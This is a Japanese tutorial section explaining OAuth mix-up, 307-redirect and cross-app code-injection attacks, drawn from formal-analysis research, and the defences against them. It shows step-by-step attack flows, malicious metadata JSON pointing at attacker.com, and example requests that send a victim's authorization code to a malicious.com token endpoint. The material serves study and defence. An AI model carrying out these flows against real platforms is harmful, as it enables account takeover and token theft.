## mix-up 攻撃と code injection の理論（形式解析）

これまでの節で扱った脆弱性（redirect_uri 検証不備、state 欠如など）は、ほとんどが「実装が仕様どおりに作られていない」ことに起因していた。本節で扱う **mix-up 攻撃（取り違え攻撃）** は性質が違う。仕様どおりに実装し、TLS もきちんと使い、redirect_uri も厳密一致で検証していても成立しうる、**プロトコル設計そのものの論理的な穴**である。

本節は次の3つの資料を順に読み解く。

1. Fett・Küsters・Schmitz「A Comprehensive Formal Security Analysis of OAuth 2.0」（2016年、ACM CCS '16。arXiv 版 v4 は 2016年8月）— 形式解析の過程で mix-up 攻撃と 307 リダイレクト攻撃を発見した原典。
2. Daniel Fett「Mix-Up, Revisited」（2020年5月）— OAuth メタデータ・PKCE・PAR が加わった現代的な構成で mix-up を再検討した分析。
3. Kaixuan Luo ほか「Cross-app OAuth Attacks in Integration Platforms: Mix-up Attacks Reloaded」（OAuth Security Workshop 2025、および USENIX Security 2025 論文）— 「非現実的」とされてきた mix-up が、統合プラットフォームで実用的な攻撃になることを示した研究。

用語を先に揃えておく。原典（2016年論文）は OpenID の用語を使い、クライアントを **RP（Relying Party：ログイン結果を信頼して利用する側のサービス）**、認可サーバーを **IdP（Identity Provider：身元を保証する側）** と呼ぶ。以下では「RP ≒ OAuth クライアント」「IdP ≒ 認可サーバー（AS）」と読み替えてよい。攻撃者が運営する IdP を **AIdP**、正直な IdP を **HIdP** と書く。

---

### 1. 原典: 形式解析で見つかった4つの攻撃（Fett ほか, 2016）

#### 1.1 形式解析とは何をしたのか

この論文の主眼は「OAuth 2.0 は安全である」ことを数学的に証明することだった。そのために著者らは **FKS モデル**（Fett・Küsters・Schmitz が提案した Web 全体の形式モデル）を土台にした。FKS モデルは **Dolev-Yao 型**（攻撃者はネットワーク上のメッセージを自由に読み・止め・偽造できるが、暗号は破れない、という古典的な攻撃者モデル）の Web モデルで、次のようなものを細かくモデル化している。

- HTTP(S) のリクエスト/レスポンスと、Cookie・Location・STS（Strict-Transport-Security）・Origin などのヘッダ
- ブラウザのウィンドウ・ドキュメント・iframe と、複雑なナビゲーション規則
- Web Storage、postMessage、スクリプト（JavaScript を抽象化したもの）、XHR
- 攻撃者による動的なブラウザの乗っ取り

この上に、RFC 6749（OAuth 2.0 本体）に加え RFC 6819（セキュリティ考慮事項）などの推奨事項・ベストプラクティスを**すべて守った** OAuth モデルを構築し、4つのグラント（認可コード、インプリシット、リソースオーナーパスワード、クライアントクレデンシャル）を、複数の RP と IdP が同時に・混在して動かせる形で記述した。悪意ある RP・IdP・ブラウザも考慮している。

証明しようとした性質は3つである。

| 性質 | 直感的な意味 | 攻撃者モデル |
|---|---|---|
| 認可（Authorization） | IdP・ユーザーのブラウザ・ユーザーが信頼する RP のいずれかが乗っ取られていない限り、攻撃者は正直な RP が得られる保護リソースを入手できない | ネットワーク攻撃者 |
| 認証（Authentication） | 同様の条件下で、攻撃者は正直な RP にユーザーとしてログインできない（RP が発行する「サービストークン」≒ セッション Cookie を得られない） | ネットワーク攻撃者 |
| セッション完全性（Session Integrity） | (a) ユーザーが OAuth フローを始めていないのにフローが完了することはない、(b) 正直な IdP を使ってある身元で始めたフローが、別の身元で完了することはない | Web 攻撃者 |

セッション完全性だけ攻撃者を弱い「Web 攻撃者」（ネットワークを盗聴・改ざんできず、自分のサイトを運営するだけの攻撃者）にしている理由が興味深い。ネットワーク攻撃者は非セキュアなオリジンから Cookie を上書きすることでユーザーを強制的に自分のアカウントでログインさせられ、`state` による CSRF 対策も無効化できてしまう。これは OAuth 固有でなく Web のセッション管理全般の問題なので、ここを含めると性質が「自明に破れる」ため除外した、と論文は説明している。

**「証明しようとしたら破れた」** —— これが本論文の最大の成果である。証明の過程で4つの攻撃が見つかった。

| 攻撃 | OAuth 認可コード | OAuth インプリシット | 破る性質 |
|---|---|---|---|
| 307 リダイレクト攻撃 | 該当 | 該当 | 認可 + 認証 |
| IdP mix-up 攻撃 | 該当（認可はクライアントシークレット未使用時） | 該当 | 認可 + 認証 |
| state 漏洩攻撃 | 該当 | 該当 | セッション完全性 |
| ナイーブ RP セッション完全性攻撃 | 該当 | 該当 | セッション完全性 |

4つとも OpenID Connect にも適用できる（mix-up は OIDC の認可コードモードとハイブリッドモードに適用）。修正を入れたモデルでは、定理1として「ネットワーク攻撃者下で認可・認証が成り立ち、Web 攻撃者下でセッション完全性が成り立つ」ことが証明された。

#### 1.2 前提知識: 「ユーザー意図の追跡」2方式

mix-up を理解する鍵は、複数 IdP に対応した RP が「このコールバックはどの IdP から返ってきたのか」をどう判断しているか、にある。論文はこれを **ユーザー意図の追跡（user intention tracking）** と呼び、2方式に分類した。

- **ナイーブな追跡（naïve）**: IdP ごとに別の redirect_uri を使い、どの URI に戻ってきたかで IdP を判断する（例: `/callback/google`、`/callback/facebook`）。
- **明示的な追跡（explicit）**: ユーザーが最初に「○○でログイン」を押した時点で、選んだ IdP をセッションに保存しておき、コールバック時にそれを参照する。redirect_uri は全 IdP 共通でよい。

明示的な追跡は一見スマートだが、ここに mix-up の穴がある。

#### 1.3 IdP mix-up 攻撃（認可コードモード）

**前提条件**（論文が明示する3つ）:

1. ユーザーが RP に「どの IdP を使うか」を送る最初のリクエストとそのレスポンスを、ネットワーク攻撃者が改ざんできる。
2. RP が HIdP と AIdP の両方でのログインを許している。
3. RP が明示的なユーザー意図追跡を使い、全 IdP に同じ redirect_uri を発行している（または IdP ごとに違う URI を発行しても同一視している）。

前提1は非現実的に見えるが、論文は丁寧に反論している。IdP を選ぶだけのリクエストには資格情報が含まれないので HTTPS の必要性が RP にも利用者にも自明でなく、当時の OAuth セキュリティ推奨もここに HTTPS を求めていなかった。HTTPS を使うつもりでも、ブラウザの HSTS プリロードリストに入っていなければ初回接続は TLS ストリッピング（HTTPS を HTTP に格下げさせる中間者攻撃）で改ざんできる。前提2は、動的クライアント登録（RP が任意の IdP に自動登録する仕組み）を使えば悪意ある IdP の混入は容易、という理由で正当化される。前提3は、mod_auth_openidc や pyoidc といった実在ライブラリがまさにそう実装していた。

原典の図3（認可コードモードへの攻撃）のメッセージ列をそのまま書き起こすと次のとおりである。

```
Browser → (RP宛)      1  POST /start   idp=HIdP         ← ユーザーは HIdP を選択
攻撃者が改ざん → RP   2  POST /start   idp=attacker     ← RP は「AIdP が選ばれた」と記録
RP → (Browser宛)      3  Redirect to Attacker /authEP  client_id′, redirect_uri, state
攻撃者が改ざん        4  Redirect to HIdP /authEP      client_id, redirect_uri, state
Browser → HIdP        5  GET /authEP  client_id, redirect_uri, state
HIdP → Browser        6  ログイン画面
Browser → HIdP        7  POST /authEP  username, password
HIdP → Browser        8  Redirect to RP redirect_uri with code, state
Browser → RP          9  GET redirect_uri  code, state
RP → AIdP            10  POST /tokenEP  code, client_id′, redirect_uri, client_secret′   ← code が漏洩
--- 認可を破る続き ---
攻撃者 → HIdP        11  POST /tokenEP  code, client_id, redirect_uri
HIdP → 攻撃者        12  access_token
攻撃者 → HIdP        13  GET /resource  access_token
HIdP → 攻撃者        14  protected resource
```

`client_id′` は RP が AIdP に登録したときの ID、`client_id` は RP が HIdP に登録したときの ID である。**client_id は公開情報**なので、攻撃者はステップ4で差し替えられる。

**なぜ成立するのか**。ステップ5以降、ブラウザ⇔HIdP⇔RP の通信はすべて HTTPS で、攻撃者は一切触れない。HIdP から見れば、正しい client_id・正しい（登録済みの）redirect_uri を持つ完全に正規の認可リクエストであり、redirect_uri の厳密一致検証も通る。state も RP が発行した本物なので RP 側の検証も通る。ところが RP はステップ2で「このユーザーは AIdP を選んだ」とセッションに記録しているため、ステップ9で届いた code を**AIdP が発行したもの**と信じ込み、AIdP のトークンエンドポイントへ送ってしまう（ステップ10）。

論文の結論はこうである: 認可コード/インプリシットモードの根本問題は、**ステップ8〜9のリダイレクト（認可レスポンス）に、それがどこから来たかを示す信頼できる情報が無い**こと。明示的追跡ではそもそも発行元情報が無く、ナイーブな追跡では redirect_uri のパスという容易に偽装できる情報しか無い。

- **認可の破壊**: HIdP が RP にクライアントシークレットを発行していなければ、攻撃者は盗んだ code を HIdP で直接トークンに交換できる（ステップ11〜12）。さらに攻撃者は自作のアクセストークンを RP に返し、偽のユーザー情報を RP に食わせることもできる。
- **認証の破壊**（シークレットがあっても成立）: 攻撃者は自分のブラウザで RP に新しいログインを開始し、HIdP を選ぶ。返ってきた HIdP へのリダイレクトは無視し、そこで得た新しいセッション Cookie と新しい `state` とともに、盗んだ code を RP のコールバックに送り込む。RP は正規の手順で HIdP から被害者のアクセストークンとユーザー ID を取得し、**攻撃者に被害者としてのセッションを発行する**。これが後に「code injection（認可コード注入）」と呼ばれる手口の原型である。

**Web 攻撃者だけで成立する変種**もある。ユーザーが自ら AIdP でのログインを選び、AIdP がパスワードを聞く代わりに（ブラウザから受け取った `state` と、RP の HIdP 用 client_id を使って）HIdP の認可エンドポイントへリダイレクトする。以降はステップ5からと同じである。ただし「AIdP を選んだのに HIdP の画面が出る」ので、注意深いユーザーなら気づきうる。

インプリシットモードでも本質は同じで（論文付録B、図7）、RP は HIdP が発行したアクセストークンを AIdP 発行だと思い込み、AIdP のリソース/ユーザー ID エンドポイントに送ってしまう。攻撃者はそのトークンを別のログインで RP に提示して、被害者になりすます。

**修正案**: IdP が自分の身元を、**攻撃者が影響を与えられない形で**認可レスポンスに含める（例: 新しい URI パラメータ）。RP はそれが期待する IdP と一致するか検査する。論文の脚注には、OAuth WG がこの修正を含む RFC ドラフトを作成し、そのパラメータが `iss`（issuer）と呼ばれていることが記されている（draft-ietf-oauth-mix-up-mitigation）。この流れは最終的に **RFC 9207「OAuth 2.0 Authorization Server Issuer Identification」（2022年3月）** として標準化された。論文は、この修正が形式モデル上で十分であり、Bansal らの「cross social-network request forgery」や OIDC Discovery を悪用する「Malicious Endpoints Attack」も同時に防ぐことを証明している。

#### 1.4 307 リダイレクト攻撃

mix-up と並んで同論文で報告された、小さなミスが資格情報漏洩に直結する例である。

**前提**: (1) IdP が RP へ戻すリダイレクトに HTTP 307 を使う、(2) IdP がユーザーの資格情報入力（POST）への**レスポンスとして直接**リダイレクトする。

**仕組み**: HTTP のリダイレクトステータスはリクエストボディの扱いが異なる。303 は「次は GET で取りに行け」を意味し、ボディを確実に捨てる。一方 307 は「メソッドとボディをそのまま保って再送せよ」を意味する。したがって次のようになる。

```
Browser → IdP   POST /authEP        username=alice&password=...
IdP → Browser   HTTP/1.1 307 Temporary Redirect
                Location: https://rp.example/callback?code=...&state=...
Browser → RP    POST /callback?code=...&state=...
                username=alice&password=...      ← フォームの中身が RP に転送される
```

RP が悪意ある者なら、ユーザーの IdP パスワードをそのまま入手できる。

**なぜ起きたか**: RFC 6749 は「例では 302 を使うが、ユーザーエージェント経由でリダイレクトを実現できる他の方法も許され、実装詳細とみなされる」と書いており、ステータスコードを規定していなかった。論文は「リダイレクト方式は実装詳細ではなく安全性に本質的」であり、HTTP 仕様上ボディを捨てることが一義的に定まっているのは 303 だけなので、**303 を必須とすべき**と主張した。この指摘は後の OAuth Security BCP（現 RFC 9700）の「307 リダイレクトを使ってはならない」旨の記述につながっている。

#### 1.5 残り2つ（mix-up との対比のため簡潔に）

- **state 漏洩攻撃**: コールバック後のページに外部リンクやリソースがあると、Referer ヘッダに `code` と `state` を含む完全な URL が乗って攻撃者に漏れる。code は使い捨てで先に消費されがちだが、**state は使い捨てと規定されていない**ため、攻撃者は漏れた state で被害者を再度コールバックに送り、自分の認可で上書きしてログイン CSRF（セッションスワッピング）を成立させられる。修正は state の単回使用化と Referrer-Policy の設定。
- **ナイーブ RP セッション完全性攻撃**: ナイーブな追跡の RP に対し、AIdP が被害者を「HIdP 用 redirect_uri」へ、攻撃者が HIdP で取った code と RP 発行の state を付けて戻す。RP は URI から「HIdP でログインした」と判断し、被害者を攻撃者の身元でログインさせる。**RP が意図を記録していないので、`iss` 型の修正は効かない**（攻撃者が偽装可能なパラメータに頼るしかない）。修正は「常に明示的追跡を使う」こと。

**検証と開示（2016年当時）**: mix-up と 307 攻撃は mod_auth_openidc で、mix-up は pyoidc でも実証された。state 漏洩は Facebook PHP SDK、ナイーブ RP 攻撃は nytimes.com で確認され、各ワーキンググループ・ベンダーに報告された。

> 出典: Daniel Fett, Ralf Küsters, Guido Schmitz「A Comprehensive Formal Security Analysis of OAuth 2.0」（arXiv:1601.01229v4, 2016） — https://arxiv.org/pdf/1601.01229

---

### 2. 現代構成での再検討: 「Mix-Up, Revisited」（Fett, 2020）

2016年論文から4年後、著者の一人 Daniel Fett が、**OAuth メタデータ**（RFC 8414。issuer を起点に各エンドポイント URL を自動取得する仕組み）・PKCE・**PAR**（Pushed Authorization Requests、RFC 9126。認可リクエストの中身をバックチャネルで事前に AS へ送り、ブラウザには `request_uri` だけを渡す仕組み）を前提に mix-up を再整理した分析である。記事は冒頭で mix-up を次のように定義する。

> 攻撃者が、「正直な」認可サーバーから得た資格情報（認可コードまたはアクセストークン）を、攻撃者の管理するサーバーへ送るようクライアントを説得する攻撃。

また「形式解析などが示すように、適切なセキュリティ機構を使えば両標準は高リスク環境でも安全に使える」という免責も明記されている。

#### 2.1 基本形（メタデータなし）と PKCE の扱い

ユーザーが悪意ある OP（OAuth Provider）`attacker.com` でフローを始めたとする（身元を偽っている OP、あるいは大規模エコシステム内で侵害された OP）。**全接続が TLS で保護されていても**次が成立する。

- attacker.com の認可サーバーは、ユーザーを honest.com の認可エンドポイントへリダイレクトする。その際、client_id をクライアントの honest.com 用のものに差し替え、**`code_challenge` も別の値に差し替える**。
- ユーザーが同意すると、code はクライアント経由で**攻撃者のトークンエンドポイント**に届く。
- この code は攻撃者が知っている PKCE チャレンジに紐付いている。攻撃者がそのチャレンジを「同じクライアントと honest.com の**別のフロー**（攻撃者自身のフロー）」から取ってきていれば、その code を自分のフローに注入できる。

ここで PKCE（Proof Key for Code Exchange：フロー開始時にクライアントが秘密 `code_verifier` のハッシュ `code_challenge` を AS に渡し、トークン交換時に `code_verifier` を示させることで「code を発行させた者と引き換える者が同一」であることを保証する仕組み）がなぜ効かないのかが核心である。PKCE の保証は「チャレンジを渡したフロー＝引き換えるフロー」であり、**チャレンジを誰が選んだかは保証しない**。mix-up では攻撃者がチャレンジを差し替えられる位置にいるため、code は最初から攻撃者のフローに紐付いて発行されてしまう。ただしこれは「オンライン攻撃」、つまり攻撃者のフローが生きている間に注入する必要があり、code を貯めておいて後で使うことはできない。

**防御の指導原理**として記事は次を掲げる: 「**認可サーバーが自らの身元を RP に対して明確にしなければならない**」。mix-up には必ず正直な AS が関与するので、この防御は攻撃者の誠実さに依存しない。具体策は2つある。

1. 認可レスポンスに `iss` パラメータを含め、どの AS が使われたかをクライアントに伝える。
2. AS の身元を redirect_uri にエンコードし、クライアントは「ユーザーが着地したエンドポイント」と「期待する AS に登録したエンドポイント」を比較する。

メタデータを使わない場合にこれで十分な理由は、クライアントが次のような**手動設定の表**でプロバイダと AS を1対1に対応付けているからである（悪意ある OP が正直な AS のエンドポイントを自分のものとして登録できない仕組みがある、という前提付き）。

| Provider | Authorization Endpoint | Token Endpoint | Resource Server |
|---|---|---|---|
| Awesome OAuth | https://awesome.auth/authz | https://awesome.auth/token | https://awesome.auth/api |
| Other Provider | https://some.other.idp/login | https://some.other.idp/te | https://some.other.idp/ |
| Malicious OP | https://malicious.auth/auth | https://malicious.auth/token | https://malicious.auth/res |

AS の身元さえ分かれば「どのプロバイダか」が一意に決まり、トークンエンドポイントも一意に決まる。

`iss` と code を署名で結び付ける必要（JARM：JWT で認可レスポンスを署名する方式）はあるか、という問いに対し、記事は「不要」と答える。攻撃者がレスポンスを改ざんできるなら、そもそも code を直接読めるので mix-up を仕掛ける必要がない。したがって code を狙う mix-up では「攻撃者はレスポンスを改ざんできない」と仮定してよい（アクセストークンを狙う場合はそれほど明確ではない、と留保付き）。

#### 2.2 メタデータがあると何が変わるか

メタデータを使うクライアントは、issuer URI から AS を**解決**する。すると攻撃者は、**自分の issuer に正直な AS のエンドポイントを割り当てる**ことができる。記事が示す3つの構成を、原典のまま示す。

**(a) 単純な mix-up**（公開クライアントなら code を直接交換可能）:

```json
{
    "issuer": "https://attacker.com",
    "authorization_endpoint": "https://honest.com/authorize",
    "token_endpoint": "https://attacker.com/token"
}
```

クライアントはユーザーを正直な認可エンドポイントへ送るが、返ってきた code を攻撃者のトークンエンドポイントへ送る。今度は攻撃者がリダイレクトで差し替える必要すらない。メタデータ自体が「honest.com で認可し attacker.com で交換せよ」と指示しているからである。

**(b) 機密クライアント + PKCE（PKCE Chosen Challenge 攻撃）**:

```json
{
    "issuer": "https://attacker.com",
    "authorization_endpoint": "https://attacker.com/authorize",
    "token_endpoint": "https://attacker.com/token"
}
```

機密クライアント（クライアントシークレットを持つ）の code は、攻撃者がシークレットを持たないので直接交換できない。そこで攻撃者は code injection に切り替える。ユーザーが攻撃者の認可エンドポイントに来た瞬間、攻撃者は**同じ機密クライアントで自分のセッションを開始**してそこから PKCE チャレンジを抜き出し、ユーザーを honest.com へリダイレクトする際にそのチャレンジに差し替える。得られた被害者の code を自分のセッションに注入すれば、クライアント自身がシークレットと正しい verifier を添えて交換してくれる。

**(c) アクセストークンの窃取**:

```json
{
    "issuer": "https://attacker.com",
    "authorization_endpoint": "https://honest.com/authorize",
    "token_endpoint": "https://honest.com/token",
    "userinfo_endpoint": "https://attacker.com/userinfo"
}
```

code の交換は正直な AS で正しく行われるが、得られたアクセストークンが攻撃者の userinfo エンドポイントへ送られる。

**メタデータ下の防御**の要点は、「AS が自分を名乗る」だけでは足りず、「**どの issuer の設定として使われうるか**」を AS が示さねばならない点である。issuer が決まればトークン・userinfo エンドポイントも決まるからだ。記事の推奨は次のとおり。

> Security BCP は、per-AS（AS ごと）の redirect URI が十分なのはメタデータで複数 issuer を解決しない場合に限られる、と明記すべきである。そうでなければ、per-Issuer（issuer ごと）の redirect URI または `iss` パラメータを使わなければならない（MUST）。

per-AS と per-Issuer の違いが肝である。上の(a)(c)では、攻撃者の issuer と正直な issuer が**同じ AS（honest.com/authorize）を共有**している。redirect_uri が AS 単位なら両者を区別できない。

#### 2.3 PAR を加えると: 16通りの組み合わせ

PAR エンドポイントもメタデータに含まれるため、PAR・認可・トークン・UserInfo の4エンドポイントそれぞれが「正直（H）」か「攻撃者（A）」かで 2⁴ = 16 通りになる。記事の表を再掲する。

| PAR | Authz | Tok | UInfo | 公開クライアント | 機密クライアント |
|---|---|---|---|---|---|
| H | H | H | H | mix-up なし | * |
| H | H | H | A | token to UInfo | * |
| H | H | A | H | code to Tok-PC, token injection | * code to Tok-NCI, token injection |
| H | H | A | A | code to Tok-PC | * code to Tok-NCI |
| H | A | H | H | mix-up なし | * 同左 |
| H | A | H | A | token to UInfo | * 同左 |
| H | A | A | H | code to Tok-PC, token injection | * code to Tok2, token injection |
| H | A | A | A | code to Tok-PC | * code to Tok2 |
| A | H | H | H | mix-up なし | mix-up なし |
| A | H | H | A | token to UInfo | 同左 |
| A | H | A | H | code to Tok-PC, token injection | code to Tok, token injection |
| A | H | A | A | code to Tok-PC | code to Tok |
| A | A | H | H | mix-up なし | 同左 |
| A | A | H | A | token to UInfo | 同左 |
| A | A | A | H | code to Tok-PC | code to Tok |
| A | A | A | A | code to Tok-PC | code to Tok |

\* デプロイ次第で mix-up は起きない（提示すべきクライアント資格情報が一致しない可能性があるため）。

凡例:

- **token to UInfo**: アクセストークンが攻撃者の UserInfo エンドポイントへ送られる。
- **code to Tok-PC**: code が攻撃者のトークンエンドポイントへ送られ、公開クライアント向けなのでそのまま使える。
- **code to Tok-NCI**: code は漏れるが、攻撃者が PKCE チャレンジを差し替えられないので code injection は防がれる（PAR が正直なので、チャレンジはバックチャネルで正直な AS に登録済み）。
- **code to Tok**: code が漏れ、PKCE Chosen Challenge による code injection が可能。
- **code to Tok2**: code が漏れ、**AS が PAR 以外のリクエストも受け付けるなら** Chosen Challenge で注入可能。
- **token injection**: 攻撃者が自分のアクセストークンをクライアントに渡し、クライアントがそれをリソースサーバーで使う。送信者制約付きトークンを無力化しうる。

その他の帰結として、認可エンドポイントが攻撃者を指すとセッション完全性が破られ（別の身元でログインさせられる）、UserInfo が攻撃者を指すと偽のユーザー情報を送り込める。

**PAR の完全性保証の限界**も分析されている。PAR はクライアント認証付きで認可リクエストの全データをバックチャネル送信するので、リクエストの完全性を約束する。

- PAR エンドポイントが正直なら、PKCE チャレンジ差し替え型は防げる。しかし攻撃者は `request_uri` 付きの認可リクエストを**丸ごと**被害者に転送でき、被害者が同意すれば code を取れる。
- PAR エンドポイントが攻撃者なら、攻撃者は PAR リクエストのパラメータを（改ざんしつつ）URL パラメータに変換し、正直な AS 向けの通常の認可リクエスト URL を組み立てられる。認可エンドポイントも攻撃者なら、そこへユーザーを転送するだけでよい。認可エンドポイントが攻撃者の管理下にない場合でも、HTTP パラメータ汚染で影響を与えようとする余地がある。

ここから次の推奨が導かれる: 「**PAR 対応の AS は、PAR リクエストのみを受け付ける**ようにすれば、完全性と mix-up 耐性がより高まる」。上表の「Tok2」行が「Tok-NCI」相当に改善されるのはこのためである。

#### 2.4 記事の結論（緩和策）

- PAR リクエストに `iss` を足してもおそらく解決しない。AS 自体が取り違えられうるからである。
- **認可レスポンスの `iss` パラメータ（とクライアントによる検査）は、上記すべての mix-up 変種を解決する。**
- per-issuer redirect URI は per-AS redirect URI と混同されやすく、後者では mix-up は解決しない。
- `iss` を JARM で保護する価値はおそらく無い（メタデータ下では攻撃者が署名検証鍵も制御できるため）。
- トークンエンドポイントが正直で UserInfo 等だけが攻撃者、という型は **送信者制約付きアクセストークン**（DPoP〔RFC 9449〕や mTLS〔RFC 8705〕のように、トークンを特定クライアントの鍵に束縛し、鍵の所持証明なしでは使えなくする方式）で緩和できる。攻撃者はトークンを別エンドポイントで再生できない。
- 認可コード自体の送信者制約（PAR + DPoP など）も検討に値する。

**時事性の注記**: 記事は 2020年5月時点のもので、参照する Security BCP は draft-14、PAR もドラフト段階だった。その後 `iss` は **RFC 9207（2022年3月）** として標準化され、AS はメタデータ `authorization_response_iss_parameter_supported: true` で対応を宣言する。Security BCP は **RFC 9700（2025年1月）** として発行され、その 4.4 節で mix-up 対策として「`iss` パラメータ、または issuer ごとに異なる redirect URI の使用」を求めている。PAR は RFC 9126（2021年9月）、DPoP は RFC 9449（2023年9月）である。

> 出典: Daniel Fett「Mix-Up, Revisited」（2020-05-04） — https://danielfett.de/2020/05/04/mix-up-revisited/

---

### 3. 理論から実用へ: 統合プラットフォームでの「Cross-app OAuth 攻撃」（OSW 2025 / USENIX Security 2025）

#### 3.1 なぜ mix-up は「低影響」とされてきたのか

OSW 2025 講演の要旨は、この問題意識から始まる。mix-up は「OAuth クライアントが複数の AS とやり取りし、そのうちの一つが悪意ある/侵害されたもの」という前提を必要とする。Google や Facebook でログインするような一般的な Web サイトでは、RP は少数の信頼できる IdP を事前登録しており、それを侵害するのは非現実的である。AS メタデータや動的クライアント登録は存在するが開発者向けの機能で、エンドユーザーが悪用できる形では露出していない。そのため**実際の影響は小さいとみなされ、防御（RFC 9207 や BCP 4.4節）の普及も限定的だった**。

#### 3.2 役割の逆転: 統合プラットフォーム

状況を変えたのが **統合プラットフォーム**（ワークフロー自動化、音声アシスタント、スマートホーム、プラグイン対応の LLM プラットフォームなど、多数のサードパーティアプリを集約し一元操作させるクラウド基盤）である。例として、Microsoft Power Automate で「Gmail の添付ファイルを Dropbox に自動保存」するような設定が挙げられている。

これらは OAuth ベースの **アカウントリンク** で、ユーザーの各アプリアカウントをプラットフォームアカウントに接続する。ここでは**プラットフォームが OAuth クライアント**、**各アプリの提供者が AS** になる。そしてマーケットプレイスは誰でもアプリを登録できる**オープンなエコシステム**なので、悪意あるアプリ（＝悪意ある AS）が容易に入り込める。従来の「信頼された少数の IdP」という前提が崩れ、mix-up の最大の障壁だった前提が自然に満たされてしまう。論文はこれを「OAuth の役割逆転（role reversal）」と呼んでいる。

#### 3.3 根本原因: 「アクティブアプリ」の取り違え

複数アプリを扱うプラットフォームは、コールバック時に「いまどのアプリの OAuth フローか（アクティブアプリ）」を知る必要がある。code 自体は発行元アプリを示さないので、実装は次のどちらかになる。これは2016年論文の「明示的追跡」「ナイーブな追跡」とちょうど対応している。

- **state（またはセッション）にアプリ ID を埋め込む** → state は「フローがどう始まったか」しか表さず、「どう終わったか」は追えない。state は AS にとって不透明な値なので、気づかれずに複数の AS を経由しうる。→ **COAT**
- **redirect_uri にアプリ ID を埋め込む** → redirect_uri 単体は完全性が弱く、AS が改ざんできる。→ **CORF**

#### 3.4 COAT（Cross-app OAuth Account Takeover）

state でアクティブアプリを識別するプラットフォームへの攻撃。論文の図5に示された、悪意ある認可エンドポイントが発行するリクエストの形を引用する。

```
① プラットフォームが被害者を悪意あるアプリへ送る
GET https://malicious.com/authorize?client_id=<malicious_app>
    &redirect_uri=https://platform.com/<malicious_app>/redirect&state=<malicious_app>

② 悪意ある認可エンドポイントが、事前に取得しておいた正規アプリの認可 URL へリダイレクト
   （state だけは①で受け取った被害者の値を保持）
GET https://benign.com/authorize?client_id=<benign_app>
    &redirect_uri=https://platform.com/<benign_app>/redirect&state=<malicious_app>

   → 正規アプリの AS からは完全に正規のリクエストに見え、
     既にリンク済みなら同意画面なしで code を発行
   → https://platform.com/<benign_app>/redirect?code=<victim>&state=<malicious_app>

③ プラットフォームは state から「悪意あるアプリのフロー」と判断し、
   被害者の code を悪意あるアプリのトークンエンドポイントへ送る
POST https://malicious.com/token
    client_id=<malicious_app>&client_secret=<malicious_app>
    &redirect_uri=https://platform.com/<malicious_app>/redirect&code=<victim>
```

state は被害者のブラウザに紐付いた本物なので、プラットフォームの CSRF 検証も通る。攻撃者は盗んだ code を、自分のプラットフォームアカウントで正規アプリとのリンクを開始したフローに注入し（通常の認可コード注入）、**被害者の正規アプリアカウントを自分のプラットフォームアカウントにリンクさせる**。これは2016年論文の IdP mix-up（認証の破壊）と構造的に同一である。プラットフォームがアプリごとに異なる redirect_uri を払い出す型を COAT_D、全アプリ共通の redirect_uri を使う型を COAT_U と区別している。

#### 3.5 CORF（Cross-app OAuth Request Forgery）

redirect_uri でアクティブアプリを識別するプラットフォームへの攻撃。攻撃者は事前に**自分の**正規アプリアカウントで code を取得し、交換せずに保持しておく。被害者が悪意あるアプリとのリンクを始めると、悪意ある認可エンドポイントは次の認可レスポンスを返す。

```
https://platform.com/<benign_app>/redirect?code=<attacker>&state=<state>
```

state は発行されたとおりに返しているので検証を通る。プラットフォームは redirect_uri のパスから「正規アプリのフロー」と判断し、正規アプリで攻撃者の code を交換して、**攻撃者の正規アプリアカウントを被害者のプラットフォームアカウントにリンクする**（既存のリンクがあれば上書き）。結果は強制アカウントリンクで、被害者の操作（たとえば保存したファイルや記録）が攻撃者のアカウントに流れ込むプライバシー漏洩になる。これは2016年論文の「ナイーブ RP セッション完全性攻撃」に対応する。

#### 3.6 影響の規模

- 18の主要な統合プラットフォーム（一般向け・企業向け）のうち、**11が COAT、さらに5が CORF に脆弱**（計16/18）。Microsoft・Google・Amazon のものを含む。そのうち9はシングルクリック攻撃が可能だった。
- 例: 何気ないリンクを1回クリックさせるだけで、被害者の Microsoft 365 スイートや Azure サービスが侵害されうる — **CVE-2023-36019（CVSS 9.6）**。
- 著者らは脆弱性を報告し、ベンダーと協力して修正を展開済み（本稿執筆時点の公開情報に基づく。個々の製品の現状はベンダーの告知で確認のこと）。予備的な結果は Black Hat USA 2024「One Hack to Rule Them All」で発表された。

#### 3.7 防御: per-AS の issuer ではなく per-app の ID

論文の防御の原理は「**認可コンテキストの一貫性の検証**」である。どのアプリが最初の接触先かを知っているのはプラットフォームだけなので、防御の責務と能力はプラットフォームにある。アクティブアプリの特定には**二重の確認**が要る。

1. プラットフォームが最初に接触したアプリを示す識別子（state に埋め込む）
2. アプリの AS が検証（または暗黙に信頼）して認可レスポンスで返す、code の実際の発行元を示す識別子

この2つが一致しない限りトークン要求に進まない。推奨策は **アプリ固有バインディング**: 登録時に各アプリへ推測不能でグローバルに一意な ID（例: ランダム UUID）を払い出し、それを state に関連付けると同時に redirect_uri のパスまたはサブドメインに埋め込む。redirect_uri は AS が事前登録値と照合してから返すので、「AS が検証した値」として機能する。擬似コードで書けば次のとおりである。

```python
# リダイレクションエンドポイントでの検査（概念コード）
def callback(req, session):
    st = verify_and_load_state(req.args["state"], session)   # ブラウザに紐付いた state を検証
    app_id_from_state = st["app_id"]                          # フロー開始時のアプリ
    app_id_from_uri   = parse_app_id(req.path)                # /apps/<uuid>/redirect の <uuid>
    if app_id_from_state != app_id_from_uri:
        abort(400)                                            # COAT も CORF もここで止まる
    exchange_code_at(app_id_from_state, req.args["code"])
```

なぜ両方が必要か: state だけなら COAT（開始したアプリと code の発行元の不一致を見逃す）、redirect_uri だけなら CORF（悪意ある AS が redirect_uri を自由に選べる）を許すからである。

移行上の注意も具体的である。COAT_U（共通 redirect_uri）のプラットフォームは、全アプリ開発者に新しい redirect_uri を AS 側で許可してもらう必要があり、一夜での切り替えは未移行アプリを壊すため移行期間が必要になる（移行済みアプリだけ厳格化し、共通 URI での応答は中断する）。COAT_D は照合ロジックの追加だけで済み、CORF は state の形式（例: JWT ペイロードの新フィールド）にアプリ ID を足すだけで AS 側に互換性問題は生じない。一時的緩和としては、OAuth 開始リクエストすべてに CSRF 保護をかけてシングルクリック攻撃を潰すか、**code がトークン要求に使われる前に**プラットフォーム独自の同意画面を出す（後では code が既に漏れているので無意味）方法が挙げられている。

